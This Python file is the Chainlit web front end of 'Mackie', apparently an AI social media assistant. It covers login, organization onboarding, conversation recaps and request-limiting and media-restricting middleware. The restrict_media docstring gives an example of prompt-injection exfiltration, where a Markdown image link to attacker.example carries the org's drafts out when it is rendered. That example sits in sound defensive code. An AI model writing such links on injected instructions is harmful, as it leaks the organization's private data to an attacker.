"""
Chainlit web UI entry point for Mackie.

Owns: the login (password_auth_callback), onboarding (asking for and
confirming the org, then opening it only if the user may), the greeting with
the agenda of what needs the user, warnings about skipped skill files, one
resumable conversation per user and org (the last messages shown again on
return, and a "Start a new conversation" action), streaming each reply
with its tool steps, the policy that lets pages load images, video and audio
only from Mackie (restrict_media), and refusing uploads and oversized requests
before they are read (refuse_large_requests). Does not own conversation logic (assistant.py), accounts
(accounts.py) or persistence (memory.py).
"""

from __future__ import annotations

import logging
from collections.abc import Awaitable, Callable
from pathlib import Path

import chainlit as cl
import litellm
import psycopg
from chainlit.server import app as web_server
from starlette.requests import Request
from starlette.responses import Response

from agent.config import load_settings

load_settings(Path(__file__).parent / ".env")

from agent import accounts, skills  # after load_settings, as config reads the settings
from agent import memory as mem
from agent.assistant import Assistant, agenda_summary, count_noun
from agent.db import DatabaseError
from agent.errors import NEW_CONVERSATION_LABEL, user_message
from agent.logs import configure_logging, describe, stack
from agent.research import website_url

# From INFO, so logins, refused logins and access changes are on record.
configure_logging("INFO")
logger = logging.getLogger("agent.app")

ORG_PROMPT: str = (
    "Hi! I'm **Mackie**, your AI social media manager. "
    "What organization are you working with?\n\n"
    "Share the **name** and **website URL** (optional) — one per line or separated by a comma."
)
ONBOARDING_TIMEOUT_S: int = 120
# A resumed conversation shows its last few messages, so the user sees where it left off.
RESUMED_MESSAGES_SHOWN: int = 6
# Each recapped message is cut to this length: a pasted post or a calendar would fill the screen.
RECAP_MESSAGE_CHARS: int = 1500
UNANSWERED_NOTE: str = "_That last message didn't get a reply._"
NEW_CONVERSATION_ACTION: str = "new_conversation"
# Images, video and audio from Mackie's own server only (logo, avatars), no plugins or
# frames; see restrict_media.
MEDIA_POLICY: str = (
    "img-src 'self' data: blob:; media-src 'self' data: blob:; object-src 'none'; frame-src 'none'"
)
# Chainlit's file upload endpoint: uploads are off, but it read (or, logged out, stored) a
# whole upload before saying so. See refuse_large_requests.
UPLOAD_PATH: str = "/project/file"
# No request Mackie serves over HTTP is near this; chat messages go over the websocket.
MAX_REQUEST_BYTES: int = 1_000_000
# Methods that send no body; any other must say how long its body is (Chainlit has DELETE
# routes that read one, before checking the login).
BODILESS_METHODS: tuple[str, ...] = ("GET", "HEAD", "OPTIONS")
SESSION_ENDED_MESSAGE: str = (
    "This login has ended: the account was removed or its password changed. "
    "Log out and log in again, or ask an admin for access."
)
NO_ACCESS_PROMPT: str = (
    "You don't have access to **{org_name}**. Ask an admin to add you, "
    "or enter another organization."
)


def _new_conversation_action() -> cl.Action:
    """The button that clears this user's conversation with the org."""
    return cl.Action(name=NEW_CONVERSATION_ACTION, payload={}, label=NEW_CONVERSATION_LABEL)


def _recap_text(text: str) -> str:
    """A recapped message, cut to RECAP_MESSAGE_CHARS."""
    return text if len(text) <= RECAP_MESSAGE_CHARS else text[:RECAP_MESSAGE_CHARS].rstrip() + " …"


@web_server.middleware("http")
async def refuse_large_requests(
    request: Request, call_next: Callable[[Request], Awaitable[Response]]
) -> Response:
    """
    Refuse the upload endpoint, and any request body over MAX_REQUEST_BYTES, before it is read.

    Chainlit read a 400 MB upload into memory before refusing it, and wrote one
    from a visitor who wasn't logged in to a temporary file, so anyone could fill
    the server's memory or disk. A body without a stated length (sent in chunks)
    can't be checked first, so it is refused too, whatever the method.
    """
    if request.url.path == UPLOAD_PATH:
        return Response(status_code=404)
    length = request.headers.get("content-length")
    chunked = "transfer-encoding" in request.headers
    if chunked or (request.method not in BODILESS_METHODS and length is None):
        return Response(status_code=411)
    if length is not None and (not length.isdigit() or int(length) > MAX_REQUEST_BYTES):
        return Response(status_code=413)
    return await call_next(request)


@web_server.middleware("http")
async def restrict_media(
    request: Request, call_next: Callable[[Request], Awaitable[Response]]
) -> Response:
    """
    Let pages load images, video and audio only from Mackie itself.

    Replies are rendered as Markdown, so an injected instruction could make
    the model write ![](https://attacker.example/?d=<the org's drafts>) and
    the browser would send the data out just by showing the image. Chainlit
    shows an image link ending in .mp4 or .webm as a video, which img-src
    alone let through.
    """
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = MEDIA_POLICY
    return response


@cl.password_auth_callback
async def login(username: str, password: str) -> cl.User | None:
    """
    Log a user in with their Mackie account; None (refused) for a wrong or locked login.

    A database that can't be reached also refuses the login (and is logged),
    rather than failing the login page with an error.
    """
    try:
        user = await accounts.authenticate(username, password)
    except (DatabaseError, psycopg.Error) as e:
        logger.error("Login failed: the database can't be reached: %s", describe(e))
        return None
    if user is None:
        return None
    return cl.User(
        identifier=user.username,
        metadata={"user_id": user.user_id, "session_key": user.session_key},
    )


def _parse_org_input(text: str) -> tuple[str, str]:
    """
    Split "Name, url", "Name url" or "Name\nurl" into (org_name, org_url); url may be empty.

    Only a part that looks like a website is taken as one, so "Feed the
    Children, Inc." stays a name; the url comes back as research.website_url
    gives it.
    """
    lines = [line.strip() for line in text.splitlines() if line.strip()]
    if len(lines) > 1:
        return lines[0], website_url(lines[1])
    line = lines[0] if lines else ""
    for separator in (",", " "):  # "Name, site" or "Name site" / "Name (site)"
        name, _, last = line.rpartition(separator)
        if name.strip() and (url := website_url(last)):
            return name.strip(" -–—:"), url  # "Name — site" too
    return line, ""


async def _ask_for_org(user_id: int) -> tuple[str, str] | None:
    """
    Ask for the org name and URL, confirm, and open the org if the user may.

    Without the confirmation step a greeting like "hello" became an org of its
    own. A new org is created with the user as its member; an existing org
    the user doesn't belong to is refused and the name asked for again.
    Returns None if the user times out.
    """
    prompt = ORG_PROMPT
    if orgs := await accounts.user_orgs(user_id):
        prompt += "\n\nYour organizations: " + ", ".join(f"**{org}**" for org in orgs)
    while True:
        res = await cl.AskUserMessage(content=prompt, timeout=ONBOARDING_TIMEOUT_S).send()
        if not res:
            return None
        org_name, org_url = _parse_org_input(res["output"])
        if not mem.slugify(org_name):
            prompt = (
                "I couldn't find an organization name in that. What's the name "
                f"(up to {mem.MAX_ORG_NAME_CHARS} characters)?"
            )
            continue
        site = f" ({org_url})" if org_url else ""
        confirm = await cl.AskActionMessage(
            content=f"Set me up for **{org_name}**{site}?",
            actions=[
                cl.Action(name="confirm", payload={"ok": True}, label="Yes, that's us"),
                cl.Action(name="retry", payload={"ok": False}, label="No, let me re-enter"),
            ],
            timeout=ONBOARDING_TIMEOUT_S,
        ).send()
        if not confirm:
            return None
        if not confirm["payload"].get("ok"):
            prompt = "No problem. What's the organization's name and website?"
        elif await accounts.open_org(user_id, mem.slugify(org_name)):
            return org_name, org_url
        else:
            prompt = NO_ACCESS_PROMPT.format(org_name=org_name)


@cl.on_chat_start
async def start() -> None:
    """Start a session: check the account, ask for the org it may open, then create the Assistant."""
    try:
        await _start()
    except Exception as e:
        logger.error("A session couldn't start: %s\n%s", describe(e), stack(e))
        await cl.Message(content=user_message(e)).send()


async def _start() -> None:
    """The session start, for start() to report what stopped it in plain words."""
    login_user = cl.user_session.get("user")
    user = await accounts.get_user(login_user.metadata["user_id"]) if login_user else None
    # A login from before a password change carries the old session key: the change ends it.
    if user is None or user.session_key != login_user.metadata.get("session_key"):
        await cl.Message(content=SESSION_ENDED_MESSAGE).send()
        return
    org = await _ask_for_org(user.user_id)
    if org is None:
        await cl.Message(content="Session timed out. Please refresh to start again.").send()
        return
    org_name, org_url = org

    problems = skills.load_skills().problems
    if problems:
        await cl.Message(
            content="**Heads-up:** some files in `skills/` were skipped:\n"
            + "\n".join(f"- {problem}" for problem in problems)
            + "\n\nEverything else works. Whoever runs Mackie can fix the file(s) and check them "
            "with scripts/validate.py."
        ).send()

    org_id = mem.slugify(org_name)
    # Kept where the org already has them, so a typed website still fills a missing one.
    await mem.fill_org_details(org_id, org_name, org_url)
    profile = await mem.load_profile(org_id)
    assistant = Assistant.for_user(org_id, user, "web")
    cl.user_session.set("assistant", assistant)

    remembered = len(profile.get("preferences", {})), len(profile.get("post_ledger", []))
    if any(remembered):
        # Lead with what needs doing, like a teammate would, instead of waiting to be asked.
        next_step = await agenda_summary(org_id) or "What would you like to work on?"
        greeting = (
            # The name doesn't end the sentence: "Feed the Children, Inc." would end in "..".
            f"Welcome back! For **{profile['name']}** I remember "
            f"{count_noun(remembered[0], 'brand preference', 'brand preferences')} and "
            f"{count_noun(remembered[1], 'post', 'posts')}. {next_step}"
        )
    else:
        greeting = (
            f"Got it! I'm set up for **{org_name}**. What would you like to work on?\n\n"
            "Tip: paste two or three of your recent posts and I'll learn your voice from them."
        )
    try:
        recap = await assistant.recent_exchanges(RESUMED_MESSAGES_SHOWN)
    except accounts.AccessRevoked as e:  # removed in the moment since the org was opened
        await cl.Message(content=_end_session(e)).send()
        return
    except Exception as e:
        # The recap is a courtesy: without it the session still works.
        logger.error("Couldn't load the recap for %s: %s", org_id, describe(e))
        recap = []
    if not recap:
        await cl.Message(content=greeting).send()
        return
    await cl.Message(
        content=f"{greeting}\n\nWe were in the middle of a conversation; here is where we left off."
    ).send()
    for speaker, text in recap:
        author = "You" if speaker == "user" else "Mackie"
        message_type = "user_message" if speaker == "user" else "assistant_message"
        await cl.Message(content=_recap_text(text), author=author, type=message_type).send()
    closing = "Carry on, or start afresh. What I learned about the organization is kept either way."
    if recap[-1][0] == "user":  # the turn failed (e.g. the conversation got too long)
        closing = f"{UNANSWERED_NOTE} {closing}"
    await cl.Message(content=closing, actions=[_new_conversation_action()]).send()


def _end_session(revoked: accounts.AccessRevoked) -> str:
    """
    End the session after its access was revoked, and return what to tell the user.

    Without its Assistant the session sends nothing more to the org.
    """
    cl.user_session.set("assistant", None)
    return f"{revoked} Refresh the page to choose another organization."


@cl.action_callback(NEW_CONVERSATION_ACTION)
async def start_new_conversation(action: cl.Action) -> None:
    """Clear this user's conversation with the org; preferences, posts and research stay."""
    assistant: Assistant | None = cl.user_session.get("assistant")
    if not assistant:
        await cl.Message(content="Please refresh the page to start a new session.").send()
        return
    try:
        await assistant.clear_history()
    except accounts.AccessRevoked as e:
        await cl.Message(content=_end_session(e)).send()
        return
    except Exception as e:
        logger.error("Starting a new conversation failed for %s: %s", assistant.org_id, describe(e))
        await cl.Message(content=f"**Something went wrong:** {user_message(e)}").send()
        return
    await action.remove()
    await cl.Message(content="Started a new conversation. What would you like to work on?").send()


@cl.on_message
async def on_message(message: cl.Message) -> None:
    """
    Forward each user message to the Assistant, streaming tool steps and text in real time.

    If the user's access to the org was removed since the session started, the
    message is refused and the session ends.
    """
    assistant: Assistant | None = cl.user_session.get("assistant")
    if not assistant:
        await cl.Message(content="Please refresh the page to start a new session.").send()
        return

    msg = cl.Message(content="")
    await msg.send()

    try:
        async for event in assistant.achat_stream(message.content):
            if event["type"] == "text":
                await msg.stream_token(event["content"])
            elif event["type"] == "tool_step":
                async with cl.Step(name=event["tool"]) as step:
                    step.input = event["input_preview"]
                    step.output = f"{event['result_preview']}  ({event['latency_ms']}ms)"
    except accounts.AccessRevoked as e:
        await msg.stream_token(_end_session(e))
    except Exception as e:
        logger.error("A turn failed for %s: %s\n%s", assistant.org_id, describe(e), stack(e))
        # Without this the user sees an empty reply and no hint that anything failed.
        await msg.stream_token(f"\n\n**Something went wrong:** {user_message(e)}")
        if isinstance(e, litellm.ContextWindowExceededError):
            # Every later turn would fail too: offer the way out right here.
            await msg.update()
            await cl.Message(content="", actions=[_new_conversation_action()]).send()
            return

    await msg.update()
